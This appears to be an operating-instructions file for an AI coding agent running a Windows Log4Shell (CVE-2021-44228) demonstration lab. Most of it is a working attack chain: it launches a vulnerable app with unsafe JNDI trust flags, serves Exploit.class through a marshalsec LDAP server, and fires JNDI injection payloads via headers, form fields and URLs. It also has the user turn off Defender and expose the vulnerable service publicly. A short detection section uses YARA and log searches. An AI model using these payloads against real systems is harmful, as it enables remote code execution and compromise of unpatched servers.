# Claude Code Operating Instructions

## Current Status
- **Lab Environment**: Windows Native (No Docker)
- **Vulnerability**: Log4j 2.14.1 confirmed vulnerable and processing JNDI lookups
- **Detection**: All security tools (YARA, Sigma, Nuclei) successfully detecting threats
- **Progress**: 100% complete - Lab ready for security demonstrations

## Lab Setup - Windows Native

### Prerequisites
1. **Java 8** - Install from: `C:\Log4Shell-Lab\tools\zulu8.30.0.1-jdk8.0.172-win_x64.msi`
2. **Python 3.x** - For HTTP server
3. **Windows Defender** - DISABLED (or exclusion for lab folder)
4. Files in `C:\Log4Shell-Lab\`

### Required Files
```
C:\Log4Shell-Lab\
├── vulnerable-app\
│   ├── SimpleVulnerable.class
│   ├── log4j-core-2.14.1.jar
│   ├── log4j-api-2.14.1.jar
│   └── marshalsec.jar
└── ldap-server\
    └── Exploit.class
```

## Starting the Lab (3 Terminals)

### Terminal 1 - Vulnerable Application
```powershell
cd C:\Log4Shell-Lab\vulnerable-app

java -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true" "-Dcom.sun.jndi.rmi.object.trustURLCodebase=true" "-Dcom.sun.jndi.cosnaming.object.trustURLCodebase=true" SimpleVulnerable 2>&1 | Tee-Object -FilePath app.log
```

### Terminal 2 - LDAP Server (marshalsec)
```powershell
cd C:\Log4Shell-Lab\vulnerable-app

java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://localhost:8888/#Exploit" 1389 0.0.0.0
```

### Terminal 3 - HTTP Server (Exploit.class)
```powershell
cd C:\Log4Shell-Lab\ldap-server\

python -m http.server 8888 --bind 0.0.0.0
```

## Exploitation

### Local Attack
```powershell
# Test JNDI expansion (should show Java version)
curl -H "User-Agent: `${java:version}" http://localhost:8080

# Launch Log4Shell exploit
curl -H "User-Agent: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080

# Alternative attack vectors
curl -H "X-Forwarded-For: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
curl -X POST -d "username=`${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
curl "http://localhost:8080/?search=`${jndi:ldap://127.0.0.1:1389/Exploit}"
```

### Browser Attack
```
http://localhost:8080/?q=${jndi:ldap://127.0.0.1:1389/Exploit}
```

### Remote Attack (replace YOUR_VM_IP)
```powershell
curl -H "User-Agent: `${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/
curl "http://YOUR_VM_IP:8080/?user=\${jndi:ldap://YOUR_VM_IP:1389/Exploit}"
```

## Remote Access Options

### Option 1: Tailscale Funnel (from office/NAT)
```powershell
# Terminal 4
tailscale funnel 8080
```
Attack URL: `https://your-machine.tailnet.ts.net/?q=${jndi:ldap://attacker.local:1389/Exploit}`

### Option 2: Direct IP (local network)
Add to hosts file: `127.0.0.1 attacker.local`

Attack URL: `http://YOUR_VM_IP:8080/?search=${jndi:ldap://YOUR_VM_IP:1389/Exploit}`

### Option 3: Public Domain
`http://logwebapp.mooo.com:9080/?search=${jndi:ldap://logwebapp.mooo.com:1389/Exploit}`

## Detection Tools

### YARA Scanning
```powershell
# Scan application logs
yara64.exe detection-rules\log4shell-enhanced.yar C:\Log4Shell-Lab\vulnerable-app\app.log

# Create test file and scan
echo "User-Agent: ${jndi:ldap://attacker.local:1389/Exploit}" > test-log4shell.log
yara64.exe detection-rules\log4shell-enhanced.yar test-log4shell.log
```

### Sigma Analysis
```powershell
# Check for JNDI patterns in logs
Select-String -Path C:\Log4Shell-Lab\vulnerable-app\app.log -Pattern '\$\{jndi:(ldap|ldaps|rmi|dns)://'
```

## Network Configuration

### Windows Firewall (Run as Admin)
```powershell
# Allow vulnerable app port
netsh advfirewall firewall add rule name="Log4Shell Lab 8080" dir=in action=allow protocol=TCP localport=8080

# Allow LDAP port
netsh advfirewall firewall add rule name="Log4Shell Lab 1389" dir=in action=allow protocol=TCP localport=1389

# Allow HTTP server port
netsh advfirewall firewall add rule name="Log4Shell Lab 8888" dir=in action=allow protocol=TCP localport=8888
```

### Verify Ports
```powershell
netstat -an | findstr :8080
netstat -an | findstr :1389
netstat -an | findstr :8888
```

## Troubleshooting

### Exploit Not Working
1. Ensure Windows Defender is OFF or has exclusions
2. Check all 3 terminals are running
3. Verify Exploit.class exists in ldap-server folder
4. Test HTTP server: `curl http://localhost:8888/Exploit.class`
5. Check Java version: `java -version` (must be Java 8)

### Port Already in Use
```powershell
# Find process using port
netstat -ano | findstr :8080
# Kill process by PID
taskkill /PID <PID> /F
```

### Connection Refused
- Check Windows Firewall rules
- Verify all services are bound to 0.0.0.0
- Test local access first before remote

## File Locations
- **Lab Files**: `C:\Log4Shell-Lab\`
- **Vulnerable App**: `C:\Log4Shell-Lab\vulnerable-app\`
- **LDAP Server**: `C:\Log4Shell-Lab\ldap-server\`
- **Detection Rules**: `.\detection-rules\`
- **Application Logs**: `C:\Log4Shell-Lab\vulnerable-app\app.log`

## Technical Details

### Vulnerability Information
- **CVE**: CVE-2021-44228 (Log4Shell)
- **Log4j Version**: 2.14.1 (vulnerable)
- **CVSS Score**: 10.0 (Critical)
- **Attack Vector**: JNDI lookup processing in log messages

### Ports
- **8080**: Vulnerable application
- **1389**: LDAP server (marshalsec)
- **8888**: HTTP server (Exploit.class)

### JVM Flags Explained
- `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true` - Trust remote LDAP codebase
- `-Dcom.sun.jndi.rmi.object.trustURLCodebase=true` - Trust remote RMI codebase
- `-Dcom.sun.jndi.cosnaming.object.trustURLCodebase=true` - Trust remote CORBA codebase

## GitHub Repository
- **URL**: https://github.com/hasamba/Log4JLab
